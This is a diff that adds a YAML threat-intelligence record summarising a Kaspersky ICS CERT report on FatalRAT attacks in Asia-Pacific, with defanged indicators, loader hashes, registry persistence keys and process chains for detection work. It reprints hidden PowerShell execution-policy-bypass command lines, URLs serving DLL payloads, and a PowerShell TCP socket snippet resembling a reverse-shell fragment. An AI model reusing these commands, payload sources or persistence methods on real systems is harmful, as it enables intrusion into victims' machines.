@@ -1,0 +1,238 @@
+description: A Kaspersky ICS CERT investigation uncovered a cyberthreat targeting
+  industrial organizations in the Asia-Pacific region, utilizing legitimate Chinese
+  cloud services (myqcloud and Youdao Cloud Notes) for infrastructure and employing
+  a multi-stage payload delivery framework to evade detection. The attackers utilized
+  techniques such as native file hosting CDNs, packers, dynamic C2 addresses, DLL
+  sideloading, and similarities were observed with RATs like Gh0st RAT, SimayRAT,
+  Zegost, and FatalRAT.
+attribution: Threat actors using open-source remote access Trojans (RATs) such as
+  Gh0st RAT, SimayRAT, Zegost, and FatalRAT. Possibly linked to the Purple Fox botnet.
+malware_families:
+- FatalRAT
+- Gh0st RAT
+- SimayRAT
+- Zegost
+TTPs:
+  processes:
+  - DLLrunYoudao.exe
+  - Fangao.dll
+  - Before.dll
+  - unrar.dll
+  - PureCodec.exe (0user.exe)
+  - YX.vbs
+  - user.bat
+  - DriverAssistant.exe (acvb.exe)
+  - wke.dll
+  - pureplayer.exe
+  commandline:
+  - K:\\C++2010\\DLLrun\\DLLrunYoudao\\Release\\DLLrunYoudao.pdb
+  - http://note.youdao[.]com/yws/api/note/4b2eead06fc72ee2763ef1f653cdc4ae
+  - http[:]//note.youdao[.]com/yws/api/note/1eaac14f58d9eff03cf8b0c76dcce913
+  - http://101.33.243[.]31:82/initialsubmission?windows_version=17134&computer_name=MYTEST:DESKTOP-CROB74D
+  - http://mytodesktest-1257538800.cos.ap-nanjing.myqcloud[.]com/DLL.dll
+  - '"C:\\Windows\\System32\\cmd.exe" /c "powershell -ExecutionPolicy Bypass -WindowStyle
+    Hidden -File C:\\Users\\Public\\Documents\\test.ps1"'
+  - powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Users\\Public\\Documents\\test.ps1
+  powershell:
+  - param($target, $port) ;$client = New-Object System.Net.Sockets.TCPClient($target,$port);$stream
+    = $client.GetStream();[byte[]]$buffer = New-Object byte[] 4096;while(($i=$stream.Read($buffer,
+    0, $buffer.Length)) -ne 0){$sendData = (New-Object System.Text.ASCIIEncoding).GetString($buffer,0,$i);}
+  scripting_engine: []
+  registry_keys:
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Logon
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableLockWorkstation
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SVP7
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections:
+  - executable: DLLrunYoudao.exe
+    destination: note.youdao[.]com
+    port: ''
+  - executable: Fangao.dll
+    destination: myqcloud[.]com
+    port: '80'
+  - executable: Before.dll
+    destination: 101.33.243[.]31
+    port: '82'
+  - executable: FatalRAT
+    destination: 8.8.8.8
+    port: ''
+  - executable: pureplayer.exe
+    destination_address: nbs2012.novadector[.]xyz
+    port: ''
+  - executable: pureplayer.exe
+    destination_address: 34.kosdage[.]asia
+    port: '443'
+  file_activity:
+  - C:\\Users\\Public\\vanconfig.ini
+  - C:\\Users\\Public\\history.txt
+  - C:\\ProgramData\\KnGoe\\PO520.rar
+  - C:\\ProgramData\\KnGoe\\QD.rar
+  - C:\\ProgramData\\KnGoe\\MMC.rar
+  - C:\\ProgramData\\8877\\YX.vbs
+  - C:\\user0\\acvb.exe
+  - C:\\Windows\\Fatal.key
+  - C:\\Windows\\nw_elf.dll
+  - C:\\Users\\Public\\Documents\\test.ps1
+  persistence:
+  - Registry key creation under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SVP7
+  - Group Policy modification via GUI simulation to create a logon script pointing
+    to malicious executable.
+  - Registry Run key modification (HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
+  pipes: []
+  process_relations:
+  - DLLrunYoudao.exe -> Fangao.dll -> FatalRAT
+  - PureCodec.exe (0user.exe) -> YX.vbs -> user.bat -> DriverAssistant.exe (acvb.exe)
+    -> wke.dll -> FatalRAT
+IOCs:
+- http://note.youdao[.]com/yws/api/note/4b2eead06fc72ee2763ef1f653cdc4ae
+- http[:]//note.youdao[.]com/yws/api/note/1eaac14f58d9eff03cf8b0c76dcce913
+- http://101.33.243[.]31:82
+- http://11-1318622059.cos.ap-nanjing.myqcloud[.]com/xxx.dll
+- http://mytodesktest-1257538800.cos.ap-nanjing.myqcloud[.]com/DLL.dll
+- 101.33.243[.]31:82
+- 11-1318622059.cos.ap-nanjing.myqcloud[.]com
+- 8.8.8.8
+- hash: 02fb1958a901d7d1c8b60ecc0e59207c
+  description: first stage loader
+- hash: 033a8d6ec5a738a1a90dd4a86c7259c8
+  description: first stage loader
+- hash: 04aa425d86f4ef8dc4fc1509b195838a
+  description: first stage loader
+- hash: 096c34df242562d278fc1578dc31df92
+  description: first stage loader
+- hash: 09a50edb49cbb59a34828a37e63be846
+  description: first stage loader
+- hash: 0a49345c77da210ab0cd031fda6bc962
+  description: first stage loader
+- hash: 0a70ea6596c92fbfb461909ed57503fa
+  description: first stage loader
+- hash: 0b20f0ff1aaff4068f99f4db69ba9c1e
+  description: first stage loader
+- hash: 0c33792c6ed37452f44ca94ce7385250
+  description: first stage loader
+- hash: 142eb5106fcc2f95b7daf37dca970595
+  description: first stage loader
+- hash: 15b7990bd006d857ee02c529b45783ac
+  description: first stage loader
+- hash: 1c79abe9f52cbe92f042615a9f6b6f10
+  description: first stage loader
+- hash: 1e80a8b3f4efb4bb27771d729f5ced85
+  description: first stage loader
+- hash: 2026ead0c2366d049ecd5e42ac1b1b07
+  description: first stage loader
+- hash: 24ecb197ee73e5b1eef2ded592640cf2
+  description: first stage loader
+- hash: 26f0806932dfd029f0fe12e49bb4c799
+  description: first stage loader
+- hash: 28231ce260ce66388d58ce536d7ed201
+  description: first stage loader
+- hash: 2aa41ae3d3ae789147218652e6593161
+  description: first stage loader
+- hash: 2bccd50322afb7a349c163ce9b76bb66
+  description: first stage loader
+- hash: 357534f6a2bffa77b83501715e382a94
+  description: first stage loader
+- hash: 362fc5799ecef8e9e328cfbf6272c48f
+  description: first stage loader
+- hash: 3843ef98a4c7ee88f10078e6a38f15ee
+  description: first stage loader
+- hash: 3883957530482a399abb5e1f06e4581f
+  description: first stage loader
+- hash: 3b32fc9115c224653f5afba793c0bbef
+  description: first stage loader
+- hash: 3ca82fd8d12967c32388ad18e9727fac
+  description: first stage loader
+- hash: 44b47fdab8ca3375fe5a875deefa265c
+  description: first stage loader
+- hash: 4fc6dbb9beeecb2d60f3fef356c6df01
+  description: first stage loader
+- hash: 502054d938a18172a3657aaf2326bcf4
+  description: first stage loader
+- hash: 50a5c5a3c07f04d96f5f1968996cfb74
+  description: first stage loader
+- hash: 50d29ee29b54685bd10b8d2917696413
+  description: first stage loader
+- hash: 58a8daae643a84c112ddc6e79c750271
+  description: first stage loader
+- hash: 58e44c4d797cecfed42c1fdf18c2d5f9
+  description: first stage loader
+- hash: 58fe500e022ea1aeebbe72c4ce694531
+  description: first stage loader
+- hash: 5b730131c3271820c03d711f2549b894
+  description: first stage loader
+- hash: 5c1de870ea1e08b25e7ce4397372f5a6
+  description: first stage loader
+- hash: 5d7fba23a44683c0b471d9a7cc7f5042
+  description: first stage loader
+- hash: 632c0808e4d0c7b293642e4c4ae8e2a2
+  description: first stage loader
+- hash: 63562347202715eff0e7f2d6ad07a2aa
+  description: first stage loader
+- hash: 63c600434def54157204765619838372
+  description: first stage loader
+- hash: 64013e613a0130cb1b7845139537bc5e
+  description: first stage loader
+- hash: 64d72e8d0539e6a0b74fb1c6e5127c05
+  description: first stage loader
+- hash: 64fdeed776cfd5e260444ae2e4a5b1a4
+  description: first stage loader
+- hash: 699ad2a5b6d9b9b59df79e9265ebd47a
+  description: first stage loader
+- hash: 6a5e3776c3bfdadd899704589f28e9fd
+  description: first stage loader
+- hash: 6a73f3bab8fb205ed46e57cf076b6f6d
+  description: first stage loader
+- hash: 7081b6781e66bdceb2b119a783b6c7fd
+  description: first stage loader
+- hash: 771a5d8fc6829618f15abe49796d1c44
+  description: first stage loader
+- hash: 790cf080abb18af471d465998b37fd1b
+  description: first stage loader
+- hash: 797d111244805e897db5c21010ee8e12
+  description: first stage loader
+- hash: 7ba376f5a71ffa21a92c7b35c3b000eb
+  description: first stage loader
+- hash: 82394a97458094b1cb22c4e243f4e9db
+  description: first stage loader
+- hash: 8c0599c0a6b7ffaff93762d0c3ea2569
+  description: first stage loader
+- hash: 8da2c4796c439f4a57536bd5c5d3f811
+  description: first stage loader
+- hash: 8e474f9321fc341770c9100853eb41eb
+  description: first stage loader
+- hash: 9037ccfcd3d3d1542089d30d3041db1c
+  description: first stage loader
+- hash: 936c16a64432348176f9183cd1524cef
+  description: first stage loader
+- hash: 93f12cbfb9ba1a66d3a050a74bab690b
+  description: first stage loader
+- hash: 949f086c40cfc5144243a24688961414
+  description: first stage loader
+- hash: 9636309c41e8a33507c349b8e9053c49
+  description: first stage loader
+- hash: 991cb5f8476edbc73223d1331704a9fd
+  description: first stage loader
+- hash: 9bb22b91b5ad59972130a3a428f7b5bb
+  description: first stage loader
+- hash: 9bf2e34511619b7c4573c3974bdbaa39
+  description: first stage loader
+- hash: 9e8a08fcddb10db8d58e17b544d81bff
+  description: first stage loader
+- hash: a009b341aa6f5bda61300dc5e7822480
+  description: first stage loader
+- hash: a7b20338dd9ed5462ddff312b67556e9
+  description: first stage loader
+- hash: ab5f57681299933c1f70b938caa526d3
+  description: first stage loader
+- hash: ac3fbdbfbc08f41e4ad1c004180093f1
+  description: first stage loader
+- ip: 43.155.73[.]235
+- domain: nbs2012.novadector[.]xyz
+- domain: 34.kosdage[.]asia
+- url: api.youkesdt[.]asia
+authors:
+- Kaspersky ICS CERT
+reference: https://ics-cert.kaspersky.com/publications/reports/2025/02/24/fatalrat-attacks-in-apac-backdoor-delivered-via-an-overly-long-infection-chain-to-chinese-speaking-targets/
+date_of_publication: February 24, 2025
+file_creation_date: June 12, 2025
